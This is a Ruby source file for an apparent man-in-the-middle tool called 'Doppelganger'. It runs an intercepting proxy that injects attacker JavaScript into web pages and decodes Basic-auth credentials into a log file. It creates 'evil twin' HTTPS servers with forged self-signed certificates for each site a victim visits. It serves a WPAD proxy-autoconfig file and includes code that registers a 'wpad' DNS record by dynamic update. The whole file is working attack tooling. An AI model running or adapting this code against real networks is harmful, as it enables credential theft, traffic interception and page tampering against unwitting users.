#!/usr/bin/ruby
#

# define external libraries
require "rubygems"
require "dnsruby"
#require "packr"
require "optparse"
require "socket"
require "net/http"
require "net/https"
require "webrick"
require "webrick/https"
require "webrick/httpproxy"
require "webrick/httputils"
require "pp"
require "base64"

$eviltwin_mapping = nil
$eviltwins = []

$doppelganger_config = nil

class Doppelganger
	@config = nil

	@Program = nil
	@HttpdServer = nil
	@ProxyServer = nil

	@ProxyAddr = nil
	@ProxyPort = 8080

	@HttpdAddr = nil
	@HttpdPort = 80
	@HttpdFileRoot = "./webdistort_htdocs/"

	@DnsDomain = nil
	@DnsServer = nil

	@LogDir = nil

	def initialize(config)
		@config = config
		$doppelganger_config = config

		puts "Starting Doppelganger"
		@Program = Doppelganger::Program.new(config)
		
		@ProxyAddr = config[:ProxyAddr]
		@ProxyPort = config[:ProxyPort]

		@HttpdAddr = config[:HttpdAddr]
		@HttpdPort = config[:HttpdPort]
		@HttpdFileRoot = config[:HttpdFileRoot]

		@LogDir = config[:LogDir]

		if @LogDir == nil
			@LogDir = "./logs/"
			config[:LogDir] = @LogDir
		end

		if !File.directory? @LogDir
			puts "Log directory doesn't exist. Creating..."
			Dir.mkdir(@LogDir)
		end

		@ProxyAddr = @HttpdAddr = @Program.GetIPAddress
		config[:HttpdAddr] = @HttpdAddr
		config[:ProxyAddr] = @ProxyAddr
		#config[:ProxyInclusionFile] = "./include.txt"
		#config[:ProxyExclusionFile] = "./exclude.txt"

		puts "Binding to IP Address: " + @HttpdAddr		

		@ProxyServer = Doppelganger::Proxy.new(config)
		@ProxyServer.Start

		@HttpdServer = Doppelganger::Httpd.new(config)
		@HttpdServer.Start
		
		Process.wait

		$eviltwins.each {|twin| 
			twin.Shutdown 
		}

		@HttpdServer.remove_generated_files
	end

	class SSLTwin
		@config = nil

		@Server = nil
		@EvilTwinPid = nil

		def initialize(config)	
			config[:ProxyPort] = 0
			@config = config			
		end

		def Server
			@Server
		end

		def Start
			host = @config[:Server]
			port = @config[:ProxyPort]

			@Server = WEBrick::HTTPServer.new(
				:ServerName => host,
				:Port => port,
				:SSLEnable => true,
				:SSLVerifyClient => ::OpenSSL::SSL::VERIFY_NONE,
				:SSLCertName => [['C', 'US'], ['O', host], ['CN', host], ['OU', rand(65535).to_s]],
				:DocumentRoot => "/tmp")
		
		@Server.mount("/", DoppelgangerCGI)
		#@Server.mount("/", WEBrick::HTTPServlet::CGIHandler, "./fetch_ssl.rb")

		puts "Starting EvilTwin Proxy server: " + host
		trap("INT") { |sig|
			puts "Shutting down EvilTwin Proxy server:" + host
			@Server.shutdown 
		}

		@EvilTwinPid = fork do
			@Server.start
		end

		$eviltwins << self
		return {
			:Server => host,
			:Port => @Server.config[:Port]
		}
	end
	
		def Shutdown
			host = @config[:Server]
			puts "Shutting down EvilTwin Proxy server:" + host
			@Server.shutdown 
		end
	end

	class Proxy
		@InjectionScripts = nil
		#@PackedScripts = nil

		@ProxyAddr = nil
		@ProxyPort = nil
		@ProxyExclusionList = nil
		@ProxyInclusionList = nil
		@ProxyExclusionFile = nil
		@ProxyInclusionFile = nil

		@HttpdAddr = nil
		@HttpdPort = nil
		@HttpdFileRoot = nil

		@BasicAuthLog = nil

		@LogDir = nil

		@Server = nil

		@RandomNum = 0

		def initialize(config)
			# Javascript get loaded in reverse order (LIFO)
			@InjectionScripts = Array["prototype.js", "inject.js"]
			#@PackedScripts = {}

			machine_bytes = ['foo'].pack('p').size
			machine_bits = machine_bytes * 8
			max_unsigned = 2**machine_bits -1

			@RandomNum = rand(max_unsigned);

			@ProxyAddr = config[:ProxyAddr]
			@ProxyPort = config[:ProxyPort]
			@ProxyInclusionFile = config[:ProxyInclusionFile]
			@ProxyExclusionFile = config[:ProxyExclusionFile]
			@ProxyExclusionList = nil
			@ProxyInclusionList = nil
			@ProxyPid = nil

			@HttpdFileRoot = config[:HttpdFileRoot]

			if @ProxyInclusionFile != nil
				if @ProxyExclusionFile != nil
					puts "Warning: Inclusion & exclusion list provided. Ignoring exclusions."
				end
				inclusion_file = File.open(@ProxyInclusionFile, "r")
				@ProxyInclusionList = []
				begin
					while line = inclusion_file.readline
						line.chomp!
						@ProxyInclusionList << line
					end
					rescue EOFError
						inclusion_file.close
				end
				puts "Loaded " + @ProxyInclusionList.length.to_s + " inclusion(s)."
			end

			if @ProxyExclusionFile != nil && @ProxyInclusionFile == nil
				exclusion_file = File.open(@ProxyExclusionFile, "r")
				@ProxyExclusionList = []
				begin
					while line = exclusion_file.readline
						line.chomp!
						@ProxyExclusionList << line
					end
					rescue EOFError
						exclusion_file.close
				end
								puts "Loaded " + @ProxyExclusionList.length.to_s + " exclusion(s)."
			end

			@HttpdAddr = config[:HttpdAddr]
			@HttpdPort = config[:HttpdPort]
			@HttpdFileRoot = config[:HttpdFileRoot]

			@LogDir = config[:LogDir]

			@Server = nil				
		end

		def TransformContents(request, response)
			uri = URI.parse(request.request_uri.to_s)
			@InjectionScripts.each { |script| 
				script_request = "/#{@RandomNum}_#{script}"
				#puts "Script path: #{script_request}; URI.Path: #{uri.path}"
				if uri.path == script_request
					file = File.open("#{@HttpdFileRoot}#{script}", "r")						
					response.body = file.read
					response.status = 200
					file.close
					return response.body
				end
			}

			perform_transformation = true

			if @ProxyInclusionList != nil
				perform_tranformation = false;
				@ProxyInclusionList.each { |url|
					regex_url = Regexp.new(url)	
					if regex_url.match(request.host)					
						puts "Match found: " + request.host + ". Transforming"
						perform_tranformation = true
					end
				}
			end
			
			if @ProxyExclusionList != nil
				perform_transformation = true
				@ProxyExclusionList.each { |url|
					regex_url = Regexp.new(url)	
					if regex_url.match(request.host)					
						puts "Match found: " + request.host + ". Dropping"
						perform_tranformation = false
					end
				}
			end
						
			request.header.each { |header| 		
				item = nil
				key = header[0]				
												
				if key =~ /authorization/i
					item = header[1][0]
					if item =~ /Basic/i
						item.gsub!(/Basic/i, "")
						basic_login = Base64.decode64(item)						
						#TODO: Create basic authentication logging.
						auth_log = File.open("#{$doppelganger_config[:LogDir]}/basic_auth.log", a)
						auth_log.syswrite("#{request.host} - #{basic_login}")
						auth_log.close
					else
						#TODO: Handle other authentication types
					end				
				end
			}

			

			if perform_transformation && response.content_type =~ /text/i
					server_url = "http://" + @HttpdAddr + ":" + @HttpdPort.to_s + "/"

					
					server_url = "#{uri.scheme}://#{uri.host}:#{uri.port}/"

					#TODO: Inject Javascript
					@InjectionScripts.each { |script|
						#file = File.open("#{@HttpdFileRoot}#{script}", "r")						
						#unpacked_code = file.read
						#packed_code = Packr.pack(unpacked_code, :shrink_vars => true, :protect => ["$super"])

						#@PackedScripts[script] = unpacked_code

						#html = "<script language=\"javascript\" type=\"text/javascript\">#{unpacked_code}</script></head>"
						js_url = "#{server_url}#{@RandomNum}_#{script}"
						html = "<script src=\"" + js_url + "\" language=\"javascript\" type=\"text/javascript\"></script></head>"
						response.body.gsub!(/\<\/head\>/i, html)
					}	

					#init_js = 'Event.observe(window, "load", function() { initialize_doppelganger(); });'
					#init_tags = "<script language=\"javascript\" type=\"text/javascript\">#{init_js}</script></head>"
					#response.body.gsub!(/\<\/head\>/i, init_tags)

					return response.body
			else
				return response.body				
			end
		end


		def Start
			proxy_logger = WEBrick::Log.new(@LogDir + "/proxy.log")
      access_log_file = File.open(@LogDir + "/proxy_access.log", "a")
      access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]      
      
      @Server = WebDistortProxy.new(
				:Logger => proxy_logger,
				:AccessLog => access_logger,
				:Port => @ProxyPort,
				:RequestCallback => Proc.new{|req,res|
					req.header.delete('accept-encoding') },
				:ProxyContentHandler => lambda {|request, response|
					response.body = self.TransformContents(request, response)})
      
			puts "Starting Doppelganger Proxy server"
			trap("INT") { |sig|
				puts "Shutting down Doppelganger Proxy server."
				@Server.shutdown 
			}

			@ProxyPid = fork do
				@Server.start
			end
		end
	
		def Shutdown
		end
	end

	class Httpd
		@Templates = nil

		@ProxyAddr = nil
		@ProxyPort = nil

		@HttpdAddr = nil
		@HttpdPort = nil
		@HttpdFileRoot = nil
		@HttpdPid = nil

		@LogDir = nil

		@Server = nil

		def initialize(config)
			@Templates = Array["wpad.dat.tpl", "inject.js.tpl"]

			@ProxyAddr = config[:ProxyAddr]
			@ProxyPort = config[:ProxyPort]

			@HttpdAddr = config[:HttpdAddr]
			@HttpdPort = config[:HttpdPort]
			@HttpdFileRoot = config[:HttpdFileRoot]
			@HttpdPid = nil

			@LogDir = config[:LogDir]

			self.transform_templates		
		end
	
		def transform_templates
			@Templates.each { |template| 
				new_tpl = template.gsub(/.tpl/, "")

				print "Transforming " + template + " into " + new_tpl + "... "
				
				template_file = File.open(@HttpdFileRoot + template, "r")
      	template_data = template_file.read
      	template_file.close

      	new_file = File.open(@HttpdFileRoot + new_tpl, "w")
				new_file.syswrite(template_data.gsub(/proxyIpAddr/, @ProxyAddr).gsub(/proxyPort/, @ProxyPort.to_s).gsub(/httpdIpAddr/, @HttpdAddr).gsub(/httpPort/, @HttpdPort.to_s))
      	new_file.close
				puts "done"
			}
		end

		def remove_generated_files			
			puts "Removing generated templates"
			@Templates.each { |template| 
				new_tpl = template.gsub(/.tpl/, "")
				file = @HttpdFileRoot + new_tpl
				puts "	Deleting " + file
				File.delete(file)							
			}
		end

		def Start
			  http_logger = WEBrick::Log.new(@LogDir + "/http.log")
  			access_log_file = File.open(@LogDir + "/http_access.log", "a")
  			access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]
  
				system_mime_table = WEBrick::HTTPUtils::DefaultMimeTypes
				user_mime_table = system_mime_table.update(
					{
				 		"dat" => "application/x-ns-proxy-autoconfig",
						"php" => "application/xhtml+xml"
					}
				)

				@Server = WEBrick::HTTPServer.new(
    			:Logger => http_logger,
			    :AccessLog => access_logger,
					:MimeTypes => user_mime_table,
					:Port => @HttpdPort, 
					:DocumentRoot => @HttpdFileRoot)

				puts "Starting Doppelganger HTTPD server"
				trap("INT") { |sig|
					puts "Shutting down Doppelganger HTTPD server."
					@Server.shutdown 
				}
				
				@HttpPid = fork do
					@Server.start
				end
		end

		def Shutdown
		end
	end

	class Program	
		def initialize(config)					
		end

		def GetIPAddress
			orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true
	
			ipAddr = nil

			UDPSocket.open do |s|
				s.connect '64.233.187.99', 1
				ipAddr = s.addr.last
			end

			ensure
				Socket.do_not_reverse_lookup = orig

			return ipAddr
		end	

		def UpdateDNS
			dns_update = Dnsruby::Update.new(@domain)
			host = 'wpad.' + @domain

			dns_update.absent(host, 'A')	
			dns_update.add(host, 'A', 86400, @host_ip)

			dns_resolver = Dnsruby::Resolver.new(:nameserver => @target_name_server)

			begin
				response = dns_resolver.send_message(dns_update)
				puts 'WPAD address created'
			        return true
				
				rescue Exception => e
					puts 'Error: ' + e
					return false
			end
		end
	end
end

class WebDistortProxy < WEBrick::HTTPProxyServer
	alias old_proxy_connect proxy_connect
	def proxy_connect(req, res)
		req.createDoppelganger	
		old_proxy_connect(req, res)
	end
end

class WEBrick::HTTPRequest
	def createDoppelganger
		host, port = @unparsed_uri.split(":", 2)
		ssl_twin_config = $doppelganger_config
		ssl_twin_config[:Server] = host

		if $eviltwin_mapping == nil
			$eviltwin_mapping = Hash.new()
		end
 
		if $eviltwin_mapping[@unparsed_uri] == nil
			d = Doppelganger::SSLTwin.new(ssl_twin_config)	 
			server_info =	d.Start
			$eviltwin_mapping[@unparsed_uri] = server_info
			puts "-" * 70
			puts "Starting new doppleganger"
			puts "~" * 70
			pp server_info
			puts "-" * 70
			@unparsed_uri = "10.0.1.103:" + server_info[:Port].to_s
		else
			server_info = $eviltwin_mapping[@unparsed_uri]
			@unparsed_uri = "10.0.1.103:" + server_info[:Port].to_s
		end		
	end
end

class DoppelgangerCGI < WEBrick::HTTPServlet::AbstractServlet
	def initialize(config)
		
	end

	def do_GET(request, response)
		
	status, type, body = process_request(request)	    
	response.status = status
	response['Content-Type'] = "text/plain" #type
	response.body = body
		
  end
	
	def process_request (request)
		uri = URI.parse(request.request_uri.to_s)

		response = []

		header = {}
		#pp request.raw_header
    request.raw_header.each {|line| 
			puts line
			key, item = line.split(":") 
			header[key] = item
		}

		pp header

		#request.header.each { |key| header[key] = request.header[key][0] }

		#pp header

		http = Net::HTTP.new(uri.host, uri.port)
   	http.use_ssl = true if uri.scheme == "https"  # enable SSL/TLS
    	http.start {
      	http.request_get(uri.path, header) {|res|
					response << res['content-type']
					response << res.body
     	 }
    	}
		return "200", response[0], response[1]
	end

	def do_POST(request, response)
		do_GET(request, response)
	end 
end

program = Doppelganger.new(
	:HttpdPort => 80,
	:HttpdFileRoot => "./htdocs/",
	:ProxyPort => 8080,
	:LogDir => "./logs/"
)
